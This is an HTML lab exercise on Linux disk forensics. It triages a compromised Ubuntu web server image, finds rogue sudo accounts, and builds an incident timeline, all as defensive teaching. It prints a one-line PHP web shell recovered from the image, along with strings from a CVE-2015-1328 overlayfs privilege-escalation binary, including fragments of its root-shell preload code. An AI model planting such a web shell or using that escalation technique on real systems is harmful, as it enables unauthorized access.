@@ -1,0 +1,620 @@
+<HTML>
+<HEAD>
+   <TITLE>Exercise 10 -- Linux Forensics</TITLE>
+   <link rel="stylesheet" type="text/css" href="../style/HalEx.css">
+</HEAD>
+<BODY>
+
+<p align="center">
+   <span class="page_title">Exercise 10: Disk Triage</span><br>
+   <span class="page_subtitle">Hands-On Exercise</span>
+</p>
+
+<h1>Goals For This Lab<p>
+
+<ol>
+<li>Discover Linux version, install date, local time zone</li><p>
+<li>Find suspiciously modified files in <tt>/etc</tt></li><p>
+<li>Pivot to find other recently modified files</li><p>
+<li>Examine web shell and possible privilege escalation</li><p>
+<li>Begin creating an incident timeline</li><p>
+</ol>
+</h1>
+
+
+<h1>Before You Get Started</h1>
+
+<p>The image of our compromised web server needs to be mounted. If you followed
+along with the slides, you may already have the image mounted under 
+<tt>/mnt/test/data</tt>. But if this directory is empty, here are the commands
+you need to quickly mount the file system from the E01 image:</p>
+
+<pre>
+[root@LAB lab09]# <b>cd /images/lab10/</b>
+[root@LAB lab10]# <b>ls</b>
+Webserver.E01  Webserver.E01.csv  Webserver.E01.txt
+[root@LAB lab10]# <b>mkdir -p /mnt/test/img</b>
+[root@LAB lab10]# <b>ewfmount Webserver.E01 /mnt/test/img</b>
+ewfmount 20140608
+
+[root@LAB lab10]# <b>mmls /mnt/test/img/ewf1</b>
+DOS Partition Table
+Offset Sector: 0
+Units are in 512-byte sectors
+
+      Slot      Start        End          Length       Description
+000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
+001:  -------   0000000000   0000002047   0000002048   Unallocated
+002:  000:000   0000002048   0000499711   0000497664   Linux (0x83)
+003:  -------   0000499712   0000501759   0000002048   Unallocated
+004:  Meta      0000501758   0066064383   0065562626   DOS Extended (0x05)
+005:  Meta      0000501758   0000501758   0000000001   Extended Table (#1)
+006:  001:000   0000501760   0066064383   0065562624   Linux Logical Volume Manager (0x8e)
+007:  -------   0066064384   0066064607   0000000224   Unallocated
+[root@LAB lab10]# <b>losetup -rf -o $((501760*512)) /mnt/test/img/ewf1</b>
+[root@LAB lab10]# <b>vgscan</b>
+  Reading volume groups from cache.
+  Found volume group "VulnOSv2-vg" using metadata type lvm2
+  Found volume group "centos" using metadata type lvm2
+[root@LAB lab10]# <b>vgchange -a y VulnOSv2-vg</b>
+  2 logical volume(s) in volume group "VulnOSv2-vg" now active
+[root@LAB lab10]# <b>lvscan | grep VulnOSv2-vg</b>
+  ACTIVE            '/dev/VulnOSv2-vg/root' [30.51 GiB] inherit
+  ACTIVE            '/dev/VulnOSv2-vg/swap_1' [768.00 MiB] inherit
+[root@LAB lab10]# <b>mkdir -p /mnt/test/data</b>
+[root@LAB lab10]# <b>mount -o ro,noexec,noload /dev/VulnOSv2-vg/root /mnt/test/data</b>
+[root@LAB lab10]# <b>mount -o ro,noexec,loop,offset=$((2048*512)) /mnt/test/img/ewf1 /mnt/test/data/boot</b>
+[root@LAB lab10]# <b>ls /mnt/test/data/boot</b>
+abi-3.13.0-24-generic         memtest86+.bin
+config-3.13.0-24-generic      memtest86+.elf
+grub                          memtest86+_multiboot.bin
+initrd.img-3.13.0-24-generic  System.map-3.13.0-24-generic
+lost+found                    vmlinuz-3.13.0-24-generic
+</pre>
+
+
+<h1>1. System Profiling</h1>
+
+<p>Before we get started with the investigation, let's gather some basic information
+about the system. What version of Linux are we dealing with? When was the system
+installed? What is the local timezone?</p>
+
+<p>To figure out the version of Linux, look for files that match the pattern
+<tt>/etc/*-release</tt>:</p>
+
+<pre>
+[root@LAB lab10]# <b>cd /mnt/test/data/etc</b>
+[root@LAB etc]# <b>ls *-release</b>
+lsb-release  os-release
+[root@LAB etc]# <b>cat lsb-release</b>
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=14.04
+DISTRIB_CODENAME=trusty
+DISTRIB_DESCRIPTION="Ubuntu 14.04.4 LTS"
+[root@LAB etc]# <b>cat os-release</b> 
+NAME="Ubuntu"
+VERSION="14.04.4 LTS, Trusty Tahr"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 14.04.4 LTS"
+VERSION_ID="14.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+</pre>
+
+<p><tt>/etc/lsb-release</tt> is typical for Debian Linux, and systems based on Debian
+Linux like Ubuntu. But we also have <tt>/etc/os-release</tt> that gives a bit more detail.</p>
+
+<p>We can infer the installation date from the creation date on various system files,
+like the <tt>/lost+found</tt> directory (typically created at the start of the system install)
+and the system SSH keys (usually created at first boot).</p>
+
+<pre>
+[root@LAB etc]# <b>stat ../lost+found/</b>
+  File: ../lost+found/
+  Size: 16384           Blocks: 32         IO Block: 4096   directory
+Device: fe03h/65027d    Inode: 11          Links: 2
+Access: (0700/drwx------)  Uid: (    0/    root)   Gid: (    0/    root)
+Access: 2016-04-03 16:05:48.000000000 +0000
+Modify: 2016-04-03 16:05:48.000000000 +0000
+Change: 2016-04-03 16:05:48.000000000 +0000
+ Birth: 2016-04-03 16:05:48.000000000 +0000
+</pre>
+
+<p>Apparently the <tt>lost+found</tt> directory was created on 
+April 3, 2016 and never updated since then. What do the SSH keys tell us?</p>
+
+<pre>
+[root@LAB etc]# <b>ls ssh</b>
+moduli            ssh_host_dsa_key.pub    ssh_host_ed25519_key.pub
+ssh_config        ssh_host_ecdsa_key      ssh_host_rsa_key
+sshd_config       ssh_host_ecdsa_key.pub  ssh_host_rsa_key.pub
+ssh_host_dsa_key  ssh_host_ed25519_key    ssh_import_id
+[root@LAB etc]# <b>stat ssh/ssh_host_*_key | grep Birth:</b>
+ Birth: 2016-04-16 13:10:23.297943668 +0000
+ Birth: 2016-04-16 13:10:23.309943668 +0000
+ Birth: 2016-04-16 13:10:23.349943668 +0000
+ Birth: 2016-04-16 13:10:22.917943668 +0000
+</pre>
+
+<p>The SSH keys seem to agree that the system was first booted on April 16, 2016--
+two weeks after the installation date. I put this down to this being a virtual machine
+image that was probably cloned and initialized multiple times from a common 
+baseline install.</p>
+
+<p>Since we're using Linux, figuring out the time zone from the image is as simple
+as running <tt>zdump</tt> on the image's <tt>/etc/localtime</tt> file:</p>
+
+<pre>
+[root@LAB etc]# <b>zdump /mnt/test/data/etc/localtime</b>
+/mnt/test/data/etc/localtime  Sat Mar 14 20:59:42 2020 CET
+</pre>
+
+<p>So the system was using Central European Time (CET). In particular, the log file
+time stamps will use that time zone.</p>
+
+<p>By the way, you might be curious what time zone I set for our lab machine:</p>
+
+<pre>
+[root@LAB etc]# <b>zdump /etc/localtime</b>
+/etc/localtime  Sat Mar 14 20:05:04 2020 UTC
+</pre>
+
+<p>Of course I used UTC. You probably guessed that already!</p>
+
+
+<h1>2. Looking for Clues</h1>
+
+<p>Now that we have established some baseline information about our forensic image,
+let's see if we can find some evil. We're sitting in the system's <tt>/etc</tt>
+directory, so we may as well start there:</p>
+
+<pre>
+[root@LAB etc]# <b>ls -lArt</b>
+<i>[... snip ...]</i>
+drwxr-xr-x. 2 root root  4096 May  4  2016 rc2.d
+drwxr-xr-x. 2 root root  4096 May  4  2016 rc1.d
+drwxr-xr-x. 2 root root  4096 May  4  2016 rc0.d
+-rw-r--r--. 1 root root 28491 May  4  2016 ld.so.cache
+-rw-r--r--. 1 root root   781 Oct  5 09:41 mtab
+-rw-------. 1 root root  1421 Oct  5 11:06 passwd-
+-rw-------. 1 root root   685 Oct  5 11:06 gshadow-
+-rw-------. 1 root root   816 Oct  5 11:06 group-
+-rw-r--r--. 1 root root   821 Oct  5 11:09 group
+-rw-r-----. 1 root gdm    690 Oct  5 11:09 gshadow
+-rw-r--r--. 1 root root  1413 Oct  5 11:14 passwd
+-rw-r-----. 1 root gdm   1271 Oct  5 11:21 shadow
+drwxr-xr-x. 3 root root  4096 Oct  5 11:24 samba
+</pre>
+
+<p>This is one of my favorite quick hacks--sorting directories by last modified
+time to see what changed recently. The <tt>-rt</tt> options do a reverse sort
+by last modified time, so the most recently modified files appear at the end
+of the listing, right above my next shell prompt, where they are easy to see
+even in a very long listing. <tt>-A</tt> means show even "hidden" files whose
+name starts with "<tt>.</tt>". <tt>-l</tt> (and that's an el not a one) means
+give a long, detailed listing for each file rather than just the file name.</p>
+
+<p><tt>passwd</tt>, <tt>shadow</tt>, and <tt>group</tt> file modifications
+seem suspicious. Happily, we have the old versions in <tt>passwd-</tt> and
+<tt>group-</tt> to compare against:</p>
+
+<pre>
+[root@LAB etc]# <b>diff -c passwd- passwd</b>
+*** passwd-	2019-10-05 11:06:38.000000000 +0000
+--- passwd	2019-10-05 11:14:38.680606853 +0000
+***************
+*** 6,14 ****
+  games:x:5:60:games:/usr/games:/usr/sbin/nologin
+  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+! mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+--- 6,15 ----
+  games:x:5:60:games:/usr/games:/usr/sbin/nologin
+  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+! mail:x:8:8:mail:/var/mail:/bin/bash
+  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
++ php:x:999:999::/usr/php:/bin/bash
+  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+***************
+*** 26,29 ****
+  sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+  postfix:x:106:114::/var/spool/postfix:/bin/false
+  postgres:x:107:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+- php:x:999:999::/usr/php:/bin/bash
+--- 27,29 ----
+</pre>
+
+<p>There's a "<tt>php</tt>" account in both files, but it seems to have
+changed position between the two versions. "<tt>php</tt>" is not a typical
+user in a Linux password file anyway, so this just seems weird.<p>
+
+<p>The default shell for user "<tt>mail</tt>" was changed from <tt>/usr/sbin/nologin</tt>
+to <tt>/bin/bash</tt>. That looks like somebody opening up that account to use
+it as a back door. I'm going to guess that at least part of the <tt>/etc/shadow</tt>
+modification was adding a password for the "<tt>mail</tt>" account:</p>
+
+<pre>
+[root@LAB etc]# <b>cat shadow</b>
+root:$6$FUG2g0oZ$KSa0C5cB4IZKYUxSAlTHW3XpUXLNaZZOcMzw5Vj0t3JEVZ9rHMPmsWUkWSxV.c4FnOEt.BCW/e7GWQZyNLbXD.:16923:0:99999:7:::
+daemon:*:16176:0:99999:7:::
+bin:*:16176:0:99999:7:::
+sys:*:16176:0:99999:7:::
+sync:*:16176:0:99999:7:::
+games:*:16176:0:99999:7:::
+man:*:16176:0:99999:7:::
+lp:*:16176:0:99999:7:::
+mail:$6$zLaoLV8N$BNxYZUxvXiZwb3UjBhCxnxd9Mb02DDUF.GfMj1kbLB.s/quBVtMM4QjfOvmZvfqeh7BuLXaRvRSfpQgNI5prE.:18174:0:99999:7:::
+<i>[... snip ...]</i>
+postgres:*:16916:0:99999:7:::
+php:$6$BmRrDVFF$0Bps0WSeRGG5T5ZVKNw6YVShkRRiQoyRXDhN1n8HBOutZX/FA4Fzz4qxxaCJ4FGETDer.5FBiEgGo8Do8ruZq/:18174::::::
+</pre>
+
+<p>Both the "<tt>mail</tt>" and "<tt>php</tt>" accounts have password hashes in the
+<tt>shadow</tt> file. If these were legitimate system accounts, their password hash field
+should be locked with a "<tt>*</tt>" like the other system accounts.</p>
+
+<p>So what's up with the modification to the <tt>group</tt> file?</p>
+
+<pre>
+[root@LAB etc]# <b>diff -c group- group</b>
+*** group-	2019-10-05 11:06:38.000000000 +0000
+--- group	2019-10-05 11:09:18.680612838 +0000
+***************
+*** 18,24 ****
+  cdrom:x:24:vulnosadmin
+  floppy:x:25:
+  tape:x:26:
+! sudo:x:27:php
+  audio:x:29:
+  dip:x:30:vulnosadmin
+  www-data:x:33:
+--- 18,24 ----
+  cdrom:x:24:vulnosadmin
+  floppy:x:25:
+  tape:x:26:
+! sudo:x:27:php,mail
+  audio:x:29:
+  dip:x:30:vulnosadmin
+  www-data:x:33:
+[root@LAB etc]# <b>grep %sudo sudoers</b>
+%sudo	ALL=(ALL:ALL) ALL
+</pre>
+
+<p>It appears that "<tt>mail</tt>" and "<tt>php</tt>" are now members of a group
+named "<tt>sudo</tt>". So I check the <tt>/etc/sudoers</tt> configuration file
+for rules about this group. You don't have to know much about <tt>sudo</tt> configuration
+to guess that this group has unlimited access via <tt>sudo</tt> according to the
+matching rule.</p>
+
+<p>So we have two rogue accounts with unlimited access to the system. That's not good!</p>
+
+
+<h1>3. Digging Deeper</h1>
+
+<p>There are a lot of directions you could go from this initial finding. For example,
+you could go investigate user artifacts from our two rogue users, or look at the
+system logs for more information about their activity. And we're certainly going to do
+that in later labs.</p>
+
+<p>But for now, I'm going to try and get a better handle on when this incident started.
+Modifying the account information requires admin level access, so that has to have happened
+relatively late in our incident. Let's try and get an idea of what happened before the
+account modifications.</p>
+
+<p>The account changes happened in the 11am hour on Oct 5, 2019. Let's try seeing what
+changed in the 24hrs prior to that:</p>
+
+<pre>
+[root@LAB etc]# <b>find /mnt/test/data -newermt '2019-10-04 00:00:00'</b>
+/mnt/test/data/usr
+/mnt/test/data/usr/php
+/mnt/test/data/root
+/mnt/test/data/root/.bash_history
+/mnt/test/data/root/.viminfo
+/mnt/test/data/etc
+/mnt/test/data/etc/gshadow
+/mnt/test/data/etc/group
+/mnt/test/data/etc/group-
+/mnt/test/data/etc/passwd-
+/mnt/test/data/etc/passwd
+/mnt/test/data/etc/mtab
+/mnt/test/data/etc/gshadow-
+/mnt/test/data/etc/shadow
+/mnt/test/data/etc/samba
+/mnt/test/data/etc/samba/dhcp.conf
+/mnt/test/data/tmp
+/mnt/test/data/tmp/apache-xTRhUVX
+/mnt/test/data/boot/grub/grubenv
+/mnt/test/data/var/www/html/jabc/scripts
+/mnt/test/data/var/www/html/jabc/scripts/update.php
+/mnt/test/data/var/mail
+/mnt/test/data/var/mail/.bash_history
+/mnt/test/data/var/mail/.cache
+/mnt/test/data/var/mail/.cache/motd.legal-displayed
+/mnt/test/data/var/lib/update-notifier/fsck-at-reboot
+/mnt/test/data/var/lib/urandom/random-seed
+/mnt/test/data/var/lib/plymouth/boot-duration
+/mnt/test/data/var/lib/mysql
+/mnt/test/data/var/lib/mysql/ibdata1
+/mnt/test/data/var/lib/mysql/ib_logfile0
+/mnt/test/data/var/lib/dhcp/dhclient.eth0.leases
+/mnt/test/data/var/lib/php5
+/mnt/test/data/var/lib/ubuntu-release-upgrader/release-upgrade-available
+/mnt/test/data/var/lib/postgresql/9.3/main
+/mnt/test/data/var/lib/postgresql/9.3/main/postmaster.pid
+/mnt/test/data/var/lib/postgresql/9.3/main/base/1
+/mnt/test/data/var/lib/postgresql/9.3/main/base/1/pg_internal.init
+/mnt/test/data/var/lib/postgresql/9.3/main/base/16384
+/mnt/test/data/var/lib/postgresql/9.3/main/base/16384/pg_internal.init
+/mnt/test/data/var/lib/postgresql/9.3/main/base/12066
+/mnt/test/data/var/lib/postgresql/9.3/main/base/12066/pg_internal.init
+/mnt/test/data/var/lib/postgresql/9.3/main/postmaster.opts
+/mnt/test/data/var/lib/postgresql/9.3/main/pg_notify
+/mnt/test/data/var/lib/postgresql/9.3/main/pg_notify/0000
+/mnt/test/data/var/lib/postgresql/9.3/main/global
+/mnt/test/data/var/lib/postgresql/9.3/main/global/pg_control
+/mnt/test/data/var/lib/postgresql/9.3/main/global/pg_internal.init
+/mnt/test/data/var/lib/postgresql/9.3/main/pg_stat_tmp
+/mnt/test/data/var/lib/postgresql/9.3/main/pg_stat_tmp/db_16384.stat
+/mnt/test/data/var/lib/postgresql/9.3/main/pg_stat_tmp/global.stat
+/mnt/test/data/var/lib/postgresql/9.3/main/pg_stat_tmp/db_12066.stat
+/mnt/test/data/var/lib/postgresql/9.3/main/pg_stat_tmp/db_0.stat
+/mnt/test/data/var/lib/postgresql/9.3/main/pg_stat_tmp/db_1.stat
+/mnt/test/data/var/lib/postgresql/9.3/main/pg_stat
+/mnt/test/data/var/lib/ureadahead/boot.pack
+/mnt/test/data/var/lib/ureadahead/pack
+/mnt/test/data/var/lib/sudo
+/mnt/test/data/var/lib/sudo/mail
+/mnt/test/data/var/lib/sudo/mail/1
+/mnt/test/data/var/lib/samba/private/passdb.tdb
+/mnt/test/data/var/spool/postfix/dev
+/mnt/test/data/var/spool/postfix/dev/log
+/mnt/test/data/var/log
+/mnt/test/data/var/log/kern.log
+/mnt/test/data/var/log/dmesg
+/mnt/test/data/var/log/faillog
+/mnt/test/data/var/log/apache2/error.log
+/mnt/test/data/var/log/apache2/access.log
+/mnt/test/data/var/log/auth.log
+/mnt/test/data/var/log/lastlog
+/mnt/test/data/var/log/btmp
+/mnt/test/data/var/log/mysql/error.log
+/mnt/test/data/var/log/mail.log
+/mnt/test/data/var/log/wtmp
+/mnt/test/data/var/log/boot.log
+/mnt/test/data/var/log/syslog
+/mnt/test/data/var/log/postgresql/postgresql-9.3-main.log
+/mnt/test/data/var/log/upstart/mysql.log
+/mnt/test/data/var/log/upstart/procps-static-network-up.log
+/mnt/test/data/var/log/upstart/systemd-logind.log
+/mnt/test/data/var/log/upstart/mountall.log
+/mnt/test/data/var/log/upstart/network-interface-eth0.log
+/mnt/test/data/var/log/upstart/console-setup.log
+/mnt/test/data/var/log/upstart/ureadahead.log
+/mnt/test/data/var/log/upstart/ureadahead-other.log
+/mnt/test/data/var/log/upstart/procps-virtual-filesystems.log
+/mnt/test/data/var/log/upstart/networking.log
+/mnt/test/data/var/log/upstart/container-detect.log
+/mnt/test/data/var/log/upstart/rsyslog.log
+/mnt/test/data/var/log/udev
+/mnt/test/data/var/log/mail.err
+</pre>
+
+<p>This is another one of my favorite little quick forensic hacks. As root we can
+create files with arbitrary timestamps. So I'm making a file dated Oct 4, 2019 at 11am
+and then using "<tt>find ... -newer ...</tt>" to look for all files modified after this
+date. Of course, there's a lot of operating system "noise" like log updates, updates to
+the backend database for our web app, and so on. But there are also some interesting
+nuggets in here.</p>
+
+<p>For example, there is some more information about our rogue user accounts:</p>
+
+<pre>
+/mnt/test/data/usr
+/mnt/test/data/usr/php
+/mnt/test/data/root
+/mnt/test/data/root/.bash_history
+/mnt/test/data/root/.viminfo
+...
+/mnt/test/data/var/mail
+/mnt/test/data/var/mail/.bash_history
+/mnt/test/data/var/mail/.cache
+/mnt/test/data/var/mail/.cache/motd.legal-displayed
+...
+/mnt/test/data/var/lib/sudo
+/mnt/test/data/var/lib/sudo/mail
+/mnt/test/data/var/lib/sudo/mail/1
+</pre>
+
+<p>There's been a <tt>.bash_history</tt> update for user <tt>mail</tt>, which implies
+somebody was actually using the account. We're also going to want to look at the
+<tt>.bash_history</tt> for <tt>root</tt> since we know the <tt>mail</tt> account had
+<tt>sudo</tt> access. There seem to be no updates for user <tt>php</tt>, so perhaps
+that account was not used.</p>
+
+<p>And speaking of <tt>sudo</tt>, the updates under <tt>/var/lib/sudo/mail</tt> imply
+the <tt>mail</tt> user actually used the <tt>sudo</tt> command. And, more specifically,
+<tt>/var/lib/sudo/mail/1</tt> implies it happened on <tt>/dev/pts/1</tt>--probably over
+SSH. We'll need to look at the logs to confirm all this.</p>
+
+
+<h1>4. Tangled Web</h1>
+
+<p>But here's the stuff that I'm most curious about from out <tt>find</tt> output. 
+It's just a few lines and could be easy to miss:</p>
+
+<pre>
+/mnt/test/data/tmp
+/mnt/test/data/tmp/apache-xTRhUVX
+...
+/mnt/test/data/var/www/html/jabc/scripts
+/mnt/test/data/var/www/html/jabc/scripts/update.php
+</pre>
+
+<p>Let's start with <tt>update.php</tt>:</p>
+
+<pre>
+[root@LAB etc]# <b>file /mnt/test/data/var/www/html/jabc/scripts/update.php</b>
+/mnt/test/data/var/www/html/jabc/scripts/update.php: PHP script, ASCII text
+[root@LAB etc]# <b>cat /mnt/test/data/var/www/html/jabc/scripts/update.php</b>
+&lt;?php
+system($_GET['cmd']);
+?&gt;
+[root@LAB etc]# <b>stat /mnt/test/data/var/www/html/jabc/scripts/update.php</b>
+  File: /mnt/test/data/var/www/html/jabc/scripts/update.php
+  Size: 31              Blocks: 8          IO Block: 4096   regular file
+Device: fe03h/65027d    Inode: 529914      Links: 1
+Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
+Access: 2019-10-05 11:17:48.480603303 +0000
+Modify: 2019-10-05 11:17:42.536603414 +0000
+Change: 2019-10-05 11:17:42.536603414 +0000
+ Birth: 2019-10-05 11:17:42.536603414 +0000
+</pre>
+
+<p><tt>update.php</tt> is a trivial web shell. Anything passed in the <tt>cmd=</tt>
+parameter of the web request is executed with the privileges of the web server
+via a call to <tt>system()</tt>. But it looks like at least this copy of the web
+shell was dropped <i>after</i> the modifications we saw to the <tt>passwd</tt>
+and <tt>shadow</tt> files.</p>
+
+<p>How about the oddly named file in <tt>/tmp</tt>?</p>
+
+<pre>
+[root@LAB etc]# <b>file /mnt/test/data/tmp/apache-xTRhUVX</b>
+/mnt/test/data/tmp/apache-xTRhUVX: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=6784235668fb3d5c306fe1c5bb46e8af4be0e944, not stripped
+[root@LAB etc]# <b>stat /mnt/test/data/tmp/apache-xTRhUVX</b>
+  File: /mnt/test/data/tmp/apache-xTRhUVX
+  Size: 12193           Blocks: 24         IO Block: 4096   regular file
+Device: fe03h/65027d    Inode: 1177371     Links: 1
+Access: (0755/-rwxr-xr-x)  Uid: (   33/www-data)   Gid: (   33/www-data)
+Access: 2019-10-05 11:04:40.296618045 +0000
+Modify: 2019-10-05 11:04:14.200618533 +0000
+Change: 2019-10-05 11:04:14.200618533 +0000
+ Birth: 2019-10-05 11:04:14.168618534 +0000
+</pre>
+
+<p>The file is a compiled executable that was dropped to disk minutes before
+the account modifications we saw in <tt>/etc</tt>. That's promising, albeit
+not in a good way for the owners of the system.</p>
+
+<p>The binary is owned by user and group 33. Let's translate that into a
+user account name using the <tt>passwd</tt> file from the system:</p>
+
+<pre>
+[root@LAB etc]# <b>grep :33: passwd</b>
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+[root@LAB etc]# <b>grep :33: group</b>
+www-data:x:33:
+</pre>
+
+<p><tt>www-data</tt> is the account Linux web servers typically run under.
+This would imply a web-based exploit of some sort. So investigating the web 
+logs from the system certainly seems warranted.</p>
+
+<p>You don't necessarily have to be an expert reverse engineer to get
+information from the executable:</p>
+
+<pre>
+[root@LAB etc]# <b>strings -a /mnt/test/data/tmp/apache-xTRhUVX</b>
+<i>[... snip ...]</i>
+overlayfs
+overlay
+lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work
+no FS_USERNS_MOUNT for overlayfs on this kernel
+.access
+/tmp/ns_sploit/work/work
+ns_last_pid
+ld.so.preload
+mount #2
+lowerdir=/tmp/ns_sploit/upper,upperdir=/etc
+lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work
+/tmp/ns_sploit/o/ld.so.preload
+spawning threads
+failed to create new user namespace
+failed to create new mount namespace
+child threads done
+/etc/ld.so.preload
+exploit failed
+/etc/ld.so.preload created
+creating shared library
+/tmp/ofs-lib.c
+#include &lt;unistd.h&gt;
+uid_t(*_real_getuid) (void);
+char path[128];
+uid_t
+getuid(void)
+_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, "getuid");
+readlink("/proc/self/exe", (char *) &path, 128);
+if(geteuid() == 0 && !strcmp(path, "/bin/su")) {
+unlink("/etc/ld.so.preload");unlink("/tmp/ofs-lib.so");
+setresuid(0, 0, 0);
+setresgid(0, 0, 0);
+execle("/bin/sh", "sh", "-i", NULL, NULL);
+    return _real_getuid();
+gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w
+couldn't create dynamic library
+/tmp/ofs-lib.so
+rm -rf /tmp/ns_sploit /tmp/ofs-lib.c
+/bin/su
+<i>[... snip ...]</i>
+</pre>
+
+<p>Try doing a Google search on some of the unique paths
+("<tt>/tmp/ofs-lib.so</tt>" or "<tt>/tmp/ns_sploit/upper</tt>") or
+strings ("<tt>failed to create new mount namespace</tt>") from the
+above output and see if you find any interesting matches.</p>
+
+<p>Looks to me like privilege escalation via CVE-2015-1328. 
+We know from <tt>/etc/lsb-release</tt> that this system was running
+Ubuntu 14.04, which was known to be vulnerable.</p>
+
+<p>So another key takeaway here is to never underestimate the
+power of <tt>strings</tt> and Google.</p>
+
+
+<h1>Summary of Findings</h1>
+
+<p>We are starting to put together at least the bare bones of
+what happened:</p>
+
+<pre>
+2019-10-05 11:04:14    /tmp/apache-xTRhUVX executable dropped by www-data
+                       (CVE-2015-1328 privilege escalation?)
+
+2019-10-05 11:09:18    /etc/group modification (mail and php in "sudo" group)
+
+2019-10-05 11:14:38    /etc/passwd modifications (mail and php accounts)
+
+2019-10-05 11:17:42    /var/www/html/jabc/scripts/update.php webshell
+                       added by root account
+
+2019-10-05 11:21:39    /etc/shadow modification (mail and php accounts???)
+</pre>
+
+<p>At this point my assumption would be some sort of "execute arbitrary code"
+type exploit on whatever web application the server was running. We've likely
+found the privilege escalation path. The <tt>mail</tt> and <tt>php</tt> accounts
+may be back-doors for later access, and there's always the web shell for the
+attackers to fall back on.</p>
+
+<p>We will flesh this out with more details in the upcoming labs!</p>
+
+
+<h1> </h1>
+<hr>
+<a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-sa/4.0/88x31.png" /></a><br /><span xmlns:dct="http://purl.org/dc/terms/" property="dct:title">Linux Forensics</span> by <span xmlns:cc="http://creativecommons.org/ns#" property="cc:attributionName">Hal Pomeranz</span> is licensed under a 
+<br><a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>.
+
+</BODY>
+</HTML>
